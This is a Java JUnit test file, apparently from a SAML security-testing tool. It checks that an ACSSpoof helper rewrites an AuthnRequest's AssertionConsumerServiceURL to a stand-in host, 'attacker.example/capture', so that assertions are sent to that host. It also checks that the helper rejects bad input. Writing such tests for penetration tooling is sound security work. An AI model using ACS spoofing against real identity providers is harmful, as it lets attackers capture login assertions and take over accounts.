package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class ACSSpoofTest {

    private static final String AUTHN_REQUEST = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="id-40d576" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"
                AssertionConsumerServiceURL="https://sp.example.com/acs"
                ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
              <saml:Issuer>https://sp.example.com/metadata</saml:Issuer>
            </samlp:AuthnRequest>
            """;

    @Test
    void rewritesACSAttributeToAttackerUrl() throws Exception {
        String attacker = "https://attacker.example/capture";
        String out = ACSSpoof.apply(AUTHN_REQUEST, attacker);
        Document doc = new XMLHelpers().getXMLDocumentOfSAMLMessage(out);
        Element req = (Element) doc.getElementsByTagNameNS("*", "AuthnRequest").item(0);
        assertEquals(attacker, req.getAttribute("AssertionConsumerServiceURL"));
    }

    @Test
    void throwsWhenNotAnAuthnRequest() {
        String response = """
                <?xml version="1.0" encoding="UTF-8"?>
                <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1"/>
                """;
        assertThrows(IllegalArgumentException.class, () ->
                ACSSpoof.apply(response, "https://a/"));
    }

    @Test
    void throwsWhenUrlEmpty() {
        assertThrows(IllegalArgumentException.class, () -> ACSSpoof.apply(AUTHN_REQUEST, ""));
        assertThrows(IllegalArgumentException.class, () -> ACSSpoof.apply(AUTHN_REQUEST, null));
    }
}
